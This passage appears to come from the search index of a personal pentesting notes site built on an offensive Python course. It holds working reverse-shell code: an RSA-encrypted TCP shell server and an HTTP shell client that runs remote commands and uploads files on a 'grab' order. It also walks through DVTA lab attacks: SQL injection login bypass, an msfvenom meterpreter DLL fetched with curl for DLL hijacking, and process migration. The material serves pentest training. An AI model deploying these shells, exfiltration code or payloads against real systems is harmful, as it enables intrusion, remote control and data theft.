Cryptodome.Cipher import PKCS1_OAEP\n\ndef encrypt(message):\n    publickey = open(\"public.pem\", \"rb\")\n    public_key = RSA.importKey(publickey.read())\n    encryptor = PKCS1_OAEP.new(public_key)\n    encrypted_data = encryptor.encrypt(message)\n    print(encrypted_data)\n    return encrypted_data\n\nmessage = 'H'*470 # Limitation on size of the clear text message is 470 bytes with a key size of 4096 bits\nencrypted_data = encrypt(message.encode())\n\n\ndef decrypt(cipher):\n    privatekey = open(\"private.pem\", \"rb\")\n    private_key = RSA.importKey(privatekey.read())\n    decryptor = PKCS1_OAEP.new(private_key)\n    print (decryptor.decrypt(cipher).decode())\n\ndecrypt(encrypted_data)\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","rsa"]},{"location":"python/tcp-reverse-shell-with-rsa-encryption/#rsa-server-side-shell","title":"RSA Server side shell","text":"<pre><code>import socket\nfrom Cryptodome.PublicKey import RSA\nfrom Cryptodome.Cipher import PKCS1_OAEP\n\ndef encrypt(message):\n    publickey = '''-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6\naP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA\nkwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82\nh/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ\npvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su\nBZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y\ngKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq\nKTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7\nU928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC\n0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe\nX2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx\n7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==\n-----END PUBLIC KEY-----'''\n    public_key = RSA.importKey(publickey)\n    encryptor = PKCS1_OAEP.new(public_key)\n    encryptedData = encryptor.encrypt(message)\n    return encryptedData\n\ndef decrypt(cipher):\n    privatekey = '''-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----'''\n    private_key = RSA.importKey(privatekey)\n    decryptor = PKCS1_OAEP.new(private_key)\n    dec = decryptor.decrypt(cipher)\n    return dec.decode()\ndef connect():\n    s = socket.socket()\n    s.bind(('192.168.0.152', 8080))\n    s.listen(1)\n    print('[+] Listening for incoming TCP connection on port 8080')\n    conn, addr = s.accept()\n\n    while True:\n        store = ''\n        command = input(\"Shell&gt; \")\n        if 'terminate' in command:\n            conn.send('terminate'.encode())\n            conn.close()\n            break\n        else:\n            command = encrypt(command.encode())\n            conn.send(command)\n            result = conn.recv(1024)\n            try:\n                print(decrypt(result))\n            except:\n                print(\"[-] unable to decrypt/receive data!\")\n\nconnect()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","encryption","rsa"]},{"location":"python/tunning-the-connection-attemps/","title":"Tunning the connection attempts","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/tunning-the-connection-attemps/#client-side","title":"Client side","text":"<p>We put our previous http shell in a function called connect.</p> <pre><code>import requests\nimport os\nimport subprocess\nimport time\n\nimport random # Needed to generate random \n\n\ndef connect(): # we put our previous http shell in a function called connect\n\n    while True:\n\n        req = requests.get('http://127.0.0.1:8080')\n        command = req.text\n\n        if 'terminate' in command:\n            return 1 # if we got terminate order, then we exit connect function and return a value of 1, this value will be used to end up the whole script\n\n\n        elif 'grab' in command:\n            grab, path = command.split(\"*\")\n            if os.path.exists(path):\n                url = \"http://127.0.0.1:8080/store\"\n                files = {'file': open(path, 'rb')}\n                r = requests.post(url, files=files)\n            else:\n                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not able to find the file!'.encode())\n        else:\n            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())\n            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stderr.read())\n    time.sleep(3)\n\n\n# Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)\n# then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the \n# infinite loop once again untill we got a sucessful connection. \n\n\nwhile True:\n    try:\n        if connect() == 1:\n            break\n    except:\n        sleep_for = random.randrange(1, 10)#Sleep for a random time between 1-10 seconds\n        time.sleep(int(sleep_for))\n        #time.sleep( sleep_for * 60 )      #Sleep for a random time between 1-10 minutes\n        pass\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"thick-applications/","title":"Introduction to Pentesting Thick Clients Applications","text":"<p>Checklist for Pentesting Thick client applications</p> <p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul> <p>Thick clients applications  are the applications that are run as standalone applications on the desktop.  Thick clients have two attack surfaces:</p> <ul> <li>Static. </li> <li>Dynamic.</li> </ul> <p>They are quite different from web services in the sense that thick applications, most of the tasks are performed at the client end, so these apps heavily depend on client's system resources like CPU, RAM or memory, for instance.</p> <p>They are usually written in these languages:</p> <ul> <li>.NET</li> <li>C/C++</li> <li>Java applets etc</li> <li>Native android / IOS mobile applications: Objective C, swift </li> <li>and more.</li> </ul> <p>They are considered old, but still might be found in some organizations.</p>","tags":["thick client applications","thick client applications pentesting"]},{"location":"thick-applications/#basic-architecture","title":"Basic Architecture","text":"<ul> <li>1-Tier Architecture: It's a standalone application.</li> <li>2-Tier Architecture: EXE/web-based launcher / java-based app + database. Business logic will be in the application. The app directly communicates to the database server. Things to consider when pentesting:  login or registering feature, DB connection, strings, TLS/SSL, Register keys. </li> <li>3-Tier Architecture: EXE + server + database. Business logic can be move to the server so security findings will be less common. These apps don't have proxy settings in them so for sending traffic to a proxy server, some changes need to be done in the system host file.</li> </ul>","tags":["thick client applications","thick client applications pentesting"]},{"location":"thick-applications/#some-decompilation-tools","title":"Some decompilation tools","text":"<ul> <li>C++ decompilation: https://ghidra-sre.org</li> <li>C# decompilation: dnspy.</li> <li>JetBrains dotPeek.</li> </ul>","tags":["thick client applications","thick client applications pentesting"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/","title":"Attacking thick clients applications: Data storage issues","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#1-hard-coded-credentials","title":"1. Hard Coded credentials","text":"<p>Developer often stores hardcode sensitive details in thick clients.</p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#strings","title":"strings","text":"<p>Strings comes in  sysInternalsSuite. It's similar to the command \"strings\" in bash. It displays all the human readable strings in a binary:</p> <pre><code>strings.exe C:\\Users\\admin\\Desktop\\tools\\original\\DVTA.exe &gt; C:\\Users\\admin\\Desktop\\strings.txt\n</code></pre> <p></p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#dnspy","title":"dnspy","text":"<p>We know the FTP conection is done in the Admin screen, so we open the application with dnspy and we locate the button in the Admin screen that calls the FTP conection. Credentials for the conection can be there:</p> <p></p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#2-storing-sensitive-data-in-registry-entries","title":"2. Storing sensitive data in Registry entries","text":"","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#regshot","title":"regshot","text":"<p>1.  Run regshot version according to your thick-app (84 or 64 v).</p> <p>2. Click on \"First shot\". It will make a \"shot\" of the existing registry entries.</p> <p>3. Open the app you want to test and login into it.</p> <p>4. Perform some kind of action, like for instance, viewing the profile.</p> <p>5. Take a \"Second shot\" of the Registry entries.</p> <p>6. After that, you will see the button \"Compare\" enabled. Click on it.</p> <p></p> <p></p> <p>An HTML file will be generated and you will see the registry entries:</p> <p></p> <p>An interesting registry is \"isLoggedIn\", that has change from false to true. This may be a potential vector of attack (we could set it to true and also change username to admin). </p> <pre><code>HKU\\S-1-5-21-1067632574-3426529128-2637205584-1000\\dvta\\isLoggedIn: \"false\"  \nHKU\\S-1-5-21-1067632574-3426529128-2637205584-1000\\dvta\\isLoggedIn: \"true\"\n</code></pre> <p></p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#3-database-connection-strings-in-memory","title":"3. Database connection strings in memory","text":"<p>When doing a connection to database, that string that does it may be: </p> <ul> <li>in clear text </li> <li>or encrypted.</li> </ul> <p>If encrypted, it 's still possible to find it in memory. If we can dump the memory of the process we should be able to find the clear text conection string  in memory. </p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#process-hacker-tool","title":"Process Hacker tool","text":"<p>Download from: https://processhacker.sourceforge.io/downloads.php</p> <p>We will be using the portable version.</p> <p>1. Open the application you want to test.</p> <p>2. Open Process Hacker Tool.</p> <p>3. Select the application, click right on \"Properties\".</p> <p>4. Select tab \"Memory\".</p> <p>5. Click on \"Strings\".</p> <p></p> <p>6. Check \"Image\" and \"Mapped\" and search!</p> <p></p> <p>7. In the results you can use the Filter option to search for (in this case) \"data source\". </p> <p></p> <p>Other possible searches: Decrypt. Clear text conection string in memory reveals credentials: powned!!!</p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#4-sql-injection","title":"4. SQL injection","text":"<p>If input is not sanitize, when login into an app we could deceive the logic of the request to the database:</p> <pre><code>select * from users username='x' and password='x';\n</code></pre> <p>In the DVTA app, we could try to do this:</p> <pre><code>select * from users username='x' or 'x'='x' and password='' or 'x'='x';\n</code></pre> <p>For that we only need to enter this into the login page:</p> <pre><code>x' or 'x'='x\n</code></pre> <p></p> <p>And now we are ... raymond!!!</p> <p></p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#5-side-channel-data-leaks","title":"5. Side channel data leaks","text":"<p>Application logs are an example of side channel data leaks. Developers offen use logs for debugging purposes during development. </p> <p>Where can you find those files? For example in Console logs. Open the command prompt and run the vulnerable thick application this way:</p> <pre><code>dvta.exe &gt; C:/Users/admin/Desktop/dvta_logs.txt\n</code></pre> <p>After that open the DVTA application, login as admin and do some actions. When done, close the application. </p> <p>If you want to add some more logs with a different user, open again the app from console and append the new outcome to the file:</p> <pre><code>dvta.exe &gt;&gt; C:/Users/admin/Desktop/dvta_logs.txt\n</code></pre> <p>Now, login into the app as a regular user and browse around. </p> <p>Open the file with the logs of the application and, if you are lucky and debug mode is still on, you will be able to see some stuff such as SQL queries, decrypted database passwords, users, temp location of the ftp file...</p> <p></p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#6-unreliable-data","title":"6. Unreliable data","text":"<p>Some applications may log some data (for instance timestamp)  for later use. If the user is able to tamper this data.</p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#7-dll-hijacking","title":"7. DLL Hijacking","text":"","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#what-is-dll-hijacking","title":"What is DLL Hijacking","text":"<p>A Dynamic Link Library (DLL) file usually holds executable code that can be used by other application, meaning that can act as a Library. This makes DLL files very attractive to attackers because if they manage to deceive the application into using a different DLL (with the same name) then this action may end up in compromising the active.</p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#how-is-dll-hijacking-perform","title":"How is DLL Hijacking perform?","text":"<p>When calling a DLL file, if an absolute path is not provided, then there are some techniques to deceive the app. </p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#placing-our-dll-in-the-directory-in-which-the-app-will-look","title":"Placing our DLL in the directory in which the app will look","text":"<p>This is the expected DLL order:</p> <ul> <li>The directory from which the application is loaded.</li> <li>The current directory.</li> <li>The system directory  <pre><code>(C:\\\\Windows\\\\System\\\\)\n</code></pre></li> <li>The 16-bit system directory.</li> <li>The Windows directory.</li> <li>The directories that are listed in the PATH environment variable.</li> </ul>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#1-locate-interesting-dll-files-with-processmonitor-or-procmon","title":"1. Locate interesting DLL files with ProcessMonitor (or ProcMon)","text":"<p>We can try to find some DLL files that the app is requesting but not finding. And for that we can use ProcessMonitor and some filters like:</p> <ul> <li>Process Name is DVTA.exe</li> <li>Result is NAME NOT FOUND</li> <li>Path ends with dll.</li> </ul> <p></p> <p>If you login into the app, you will find some DLL files that can be used to try an exploitation:</p> <p></p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#2-crafting-our-malicious-dll-and-serving-them-to-the-machine","title":"2. Crafting our malicious DLL and serving them to the machine","text":"<p>We will be assuming we will try to deceive the app with these 2 files:</p> <ul> <li>SECUR32.dll </li> <li>DWrite.dll</li> </ul> <p>We will open a kali machine, we will craft two dll payloads using msfvenom, we will copy them into our root apacher server and we will launch apache to serve those two files. Commands:</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IPAttacker&gt; LPORT=&lt;4444&gt; -a x86 -f dll &gt; SECUR32.dll\n# -p: for the chosen payload\n# -a: architecture in the victim machine/application\n# -f: format for the output file\n\n# Copying payloads to apache root folder\nsudo cp SECUR32.dll /var/www/html/\ncp SECUR32.dll DWrite.dll\nsudo cp DWrite.dll /var/www/html \n\n# starting apache\nservice apache2 start\n</code></pre> <p></p> <p>Now, in the Windows 10 VM (maybe after disabling RealTime protection), we can retrieve those files with:</p> <pre><code>curl http://10.0.2.15/SECUR32.dll --output C:\\Users\\admin\\Desktop\\SECUR32.dll\ncurl http://10.0.2.15/SECUR32.dll --output C:\\Users\\admin\\Desktop\\Dwrite.dll\n</code></pre>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#3-launching-the-attack","title":"3. Launching the attack","text":"<p>Place the DLL crafted file into the same folder than the application. In my case I will place DWrite.dll into </p> <pre><code>C:\\Users\\admin\\Desktop\\tools\\original\n</code></pre> <p>In the Kali machine, start metasploit and set a handler:</p> <pre><code>msfconsole\n</code></pre> <pre><code>use exploit/multi/handle\nset payload windows/meterpreter/reverse_tcp\nset LHOST 10.0.2.15\nset LPORT 4444\nrun\n</code></pre> <p>Now you can start the application in the windows machine, and on the listener handler in kali, you will get a meterpreter. </p>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#4-moving-your-meterpreter-to-a-different-process","title":"4. Moving your meterpreter to a different process","text":"<p>List all processes in the meterpreter and migrate to a less suspicious one. This will also unblock the DVTA app in the windows machine:</p> <pre><code>ps\nmigrate &lt;ID&gt;\n</code></pre>","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-attacking-thick-clients-applications/#how-to-connect-to-a-database-after-getting-the-credentials","title":"How to connect to a database after getting the credentials","text":"","tags":["thick client applications","thick client applications pentesting","strings","dnspy","regshot","process hacker tool","sql injection","dll hickjacking"]},{"location":"thick-applications/tca-basic-lab-setup/","title":"Basic Lab Setup - Thick client Applications","text":"<p>General index of the course</p> <ul> <li>Introduction.</li> <li>Tools for pentesting thick client applications.</li> <li>Basic lab setup.</li> <li>First challenge: enabling a button.</li> <li>Information gathering phase.</li> <li>Traffic analysis.</li> <li>Attacking thick clients applications.</li> <li>Reversing and patching thick clients applications.    </li> <li>Common vulnerabilities.</li> </ul>","tags":["thick client applications","thick client applications pentesting","labs"]},{"location":"thick-applications/tca-basic-lab-setup/#environment-description","title":"Environment description","text":"<ul> <li>VirtualBox or VMWare Installation workstation.</li> <li>Windows 10 VM 1 (database) -&gt; SQL server.</li> <li>(optional) Windows 10 VM 2 (client) -&gt; DVTA.</li> </ul> <p>In the course we will be using an unique Windows 10 machine with both the SQL server and the DVTA application installed. Therefore, there will not be the need to have a second Windows 10 VM since all the needed applications will be installed on this unique virtual machine.</p>","tags":["thick client applications","thick client applications pentesting","labs"]},{"location":"thick-applications/tca-basic-lab-setup/#software-resources","title":"Software resources","text":"<ul> <li>Get windows 10 iso from: Repo for legacy Operating system.</li> <li>Damn Vulnerable Thick Client Application DVTA (modified version given in the course): https://drive.google.com/open?id=1u46XDgVpCiN6eGAjILnhxsGL9Pl2qgcD.</li> <li>SQL Server Express 2008: SQL Server\u00ae 2008 R2 SP2.</li> <li>SQL Server Management Studio SQL Server Management Studio (SSMS).</li> <li>Filezilla FTP Server: FileZilla Server for Windows (64bit x86) (filezilla-project.org).</li> </ul> <p>Now, open the Windows 10 VM and start the lab setup!</p>","tags":["thick client applications","thick client applications pentesting","labs"]},{"location":"thick-applications/tca-basic-lab-setup/#1-install-sql-server-express-2008","title":"1. Install SQL Server Express 2008","text":"<p>In the Download page we will choose SQLEXPR_x64_ENU.exe. </p> <p>Some helpful tips and screenshots about the installation:</p> <p></p> <p></p> <p></p> <p></p>","tags":["thick client applications","thick client applications pentesting","labs"]},{"location":"thick-applications/tca-basic-lab-setup/#2-install-sql-server-management-studio-1901","title":"2. Install SQL Server Management Studio 19.0.1","text":"<p>This installation is pretty straighforward. Download page</p> <p></p>","tags":["thick client applications","thick client applications pentesting","labs"]},{"location":"thick-applications/tca-basic-lab-setup/#creating-database-dtva-four-our-vuln-thick-app","title":"Creating database DTVA four our vuln thick app","text":"<p>We will create the database \"DVTA\" and we will populate it with some users and expenses:</p> <p>1. Open SSMS (SQL Server Management Studio) and right click on the \"Database\" object, and create a new database called DVTA.</p> <p></p> <p>2.  Create a new table \"users\" in the database DVTA.</p> <p></p> <p>Here is the query:</p> <pre><code>CREATE TABLE \"users\" (\n    \"id\" INT IDENTITY(0,1) NOT NULL,\n    \"username\" VARCHAR(100) NOT NULL,\n    \"password\" VARCHAR(100) NOT NULL,\n    \"email\" VARCHAR(100) NULL DEFAULT NULL,\n    \"isadmin\" INT NULL DEFAULT '0',\n    PRIMARY KEY (\"id\")\n)\n</code></pre> <p>3. Populate the database with 3 given users:</p> <p></p> <p>Here is the query:</p> <pre><code>INSERT INTO dbo.users (username, password, email, isadmin)\nVALUES\n('admin','admin123','admin@damnvulnerablethickclientapp.com',1),\n('rebecca','rebecca','rebecca@test.com',0),\n('raymond','raymond','raymond@test.com',0);\n</code></pre> <p>4.  Create the  table \"expenses\" in the database DVTA.</p> <p></p> <p>Here is the query:</p> <pre><code>CREATE TABLE \"expenses\" (\n    \"id\" INT IDENTITY(0,1) NOT NULL,\n    \"email\" VARCHAR(100) NOT NULL,\n    \"item\" VARCHAR(100) NOT NULL,\n    \"price\" VARCHAR(100) NOT NULL,\n    \"date\" VARCHAR(100) NOT NULL,\n    \"time\" VARCHAR(100) NULL DEFAULT NULL,\n    PRIMARY KEY (\"id\")\n)\n</code></pre>","tags":["thick client applications","thick client applications pentesting","labs"]},{"location":"thick-applications/tca-basic-lab-setup/#adittional-configurations","title":"Adittional configurations","text":"<p>Some configurations need to be done so the conection works: </p> <p>1. Open  SQL Server Configuration Manager and enable TCP/IP Protocol conections:</p> <p></p> <p>2. Also in SQL Server Configuration Manager, restart SQL Server (SQLEXPRESS)</p> <p></p>","tags":["thick client applications","thick client applications pentesting","labs"]},{"location":"thick-applications/tca-basic-lab-setup/#3-install-filezilla-ftp-server","title":"3. Install Filezilla FTP server","text":"<p>1. Download Filezilla Server, install it and initiate a connection: Download page</p> <p>As for the conection initiation, I'm using localhost 127.0.0.1, port 14148 and password \"filezilla\": </p> <p></p> <p>2. Add a user. Name \"dvta\" and password \"p@ssw0rd\"</p> <p></p> <p>3. Add a Shared folder. Be careful with slashes and backslashes (wink!) not to get the typical error \"error on row number 1 virtual path must be absolute\".</p> <p></p>","tags":["thick client applications","thick client applications 